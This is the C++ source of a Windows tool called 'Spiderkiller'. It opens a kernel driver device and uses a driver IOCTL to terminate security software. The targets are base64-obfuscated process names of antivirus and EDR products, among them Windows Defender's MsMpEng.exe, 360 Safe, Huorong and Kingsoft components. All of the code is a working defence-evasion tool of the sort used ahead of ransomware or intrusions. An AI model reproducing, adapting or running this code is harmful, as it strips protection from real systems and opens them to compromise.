#include <Windows.h>
#include <iostream>
#include <vector>
#include <tlhelp32.h>
#include <codecvt>
#include <locale>
#pragma comment(lib, "Crypt32.lib") 

#define DeviceName "\\\\.\\KevP64"

std::wstring DecryptToWstring(const std::string& base64Input) {
    DWORD dataSize = 0;
    CryptStringToBinaryA(base64Input.substr(1).c_str(), 0, CRYPT_STRING_BASE64, nullptr, &dataSize, nullptr, nullptr);

    std::vector<BYTE> decryptedData(dataSize);
    if (CryptStringToBinaryA(base64Input.substr(1).c_str(), 0, CRYPT_STRING_BASE64, decryptedData.data(), &dataSize, nullptr, nullptr)) {
        std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
        return converter.from_bytes(reinterpret_cast<const char*>(decryptedData.data()), reinterpret_cast<const char*>(decryptedData.data()) + dataSize);
    }
    return L"";
}

DWORD GetProcessNumber(LPCWSTR pn) {
    DWORD ProcessNumber = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 WindowsPE;
        WindowsPE.dwSize = sizeof(WindowsPE);

        if (Process32First(hSnap, &WindowsPE))
        {
            if (!WindowsPE.th32ProcessID)
                Process32Next(hSnap, &WindowsPE);
            do
            {
                if (!lstrcmpiW((LPCWSTR)WindowsPE.szExeFile, pn))
                {
                    ProcessNumber = WindowsPE.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &WindowsPE));
        }
    }
    CloseHandle(hSnap);
    return (ProcessNumber);
}

void help() {
    std::wcout << L"[+] Usage: Spiderkiller.exe start" << std::endl;
}

int main(const int argc, char ** argv) {
    if (argc < 2&& argv[1]!="start") {
        help();
        return -1;
    }
    int ProcessCount = 0;
    std::cout << "[+] Spiderkiller Start." << std::endl;
    std::cout << "[+] Spiderkiller Start." << std::endl;
    std::cout << "[+] Spiderkiller Start." << std::endl;
    std::vector<std::string> ListEncryptProcessName = {
    "AMzYwdHJheS5leGU=", "xMzYwc2FmZS5leGU=", "memh1ZG9uZ2Zhbmd5dS5leGU=", "wMzYwcnAuZXhl",
    "Gc2FmZWJveFRyYXkuZXhl", "sMzYwc2FmZWJveC5leGU=", "qMzYwc2QuZXhl", "iSGlwc1RyYXkuZXhl",
    "SSGlwc0RhZW1vbi5leGU=", "Td3NjdHJsc3ZjLmV4ZQ==", "2d3NjdHJsLmV4ZQ==", "cdXN5c2RpYWcuZXhl",
    "HTXNNcEVuZy5leGU=","DTXBDbWRSdW4uZXhl","cc2ZhdnRyYXkuZXhl","sc2ZhdnVpLmV4ZQ==",
    "wZWFpb19hZ2VudC5leGU=","WZWFpb19zZXJ2aWNlLmV4ZQ==","WZWRyX2FnZW50LmV4ZQ==","ZZWRyX21vbml0b3IuZXhl",
    "SeHNfYWdlbnQuZXhl","ZUVFQcm90ZWN0LmV4ZQ==","SQXRIb3N0LmV4ZQ==","QVXBsb2FkRXhlLmV4ZQ==","ZQXRUcmF5LmV4ZQ==",
    "gQXRVc2JTY2FuLmV4ZQ==","Ja0RvY1NlY3VyaXR5LmV4ZQ==","KSXBjU2VydmVyLmV4ZQ==","Ca2lzYWFzc3ZyLmV4ZQ==",
    "Aa3dzcHJvdGVjdDY0LmV4ZQ==","Ca3hldHJheS5leGU=","ea3hlc2NvcmUuZXhl",
    "ha3hld3NjLmV4ZQ==","ta25ld3ZpcC5leGU=","ja2NkZGx0b29sLmV4ZQ==","oa3hlY2VudGVyLmV4ZQ==",
    "MzYwZW50Y2xpZW50LmV4ZQ==","CUVFQQ1JUUC5leGU=","WUVFQcm90ZWN0LmV4ZQ==","UVFQQ1RyYXkuZXhl","SYWJzX2RlcGxveWVyLmV4ZQ=="
    };
    std::cout << "[+] Spiderkiller Start." << std::endl;
    std::cout << "[+] Spiderkiller Start." << std::endl;
    std::cout << "[+] Spiderkiller Start." << std::endl;
    HANDLE HanDevice = CreateFileA(DeviceName, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (HanDevice == INVALID_HANDLE_VALUE) {
        std::cout << "[-] Failed to Open Handle to Driver." << std::endl;
        return (-1);
    }
    DWORD Returnedbytes = 0;
    DWORD output[2] = { 0 };
    DWORD outputSize = sizeof(output);
    //
    unsigned int int_code = 2236468;
    DWORD TPROCESS_CODE = static_cast<DWORD>(int_code);
    std::cout << "[+] Driver initialized successfully." << std::endl;
    for (const std::string& EncryptProcessName : ListEncryptProcessName) {
        std::wstring decryptedWstr = DecryptToWstring(EncryptProcessName);
        if (!decryptedWstr.empty()) {
            LPCWSTR ProcessName = decryptedWstr.c_str();
            DWORD Processnumber = GetProcessNumber(ProcessName);
            if (Processnumber != 0) {
                if (DeviceIoControl(HanDevice, TPROCESS_CODE, &Processnumber, sizeof(Processnumber), output, outputSize, &Returnedbytes, NULL)) {
                    ProcessCount++;
                    std::wcout << L"[+] Terminating Process Name: " << ProcessName << L",Process Pid: " << Processnumber << std::endl;
                }
            }
        }
    }
    if (ProcessCount != 0) {
        std::cout << "[+] Process has been terminated." << std::endl;
    }
    else
    {
        std::cout << "[*] No relevant processes were found." << std::endl;
    }
       
    CloseHandle(HanDevice);
}
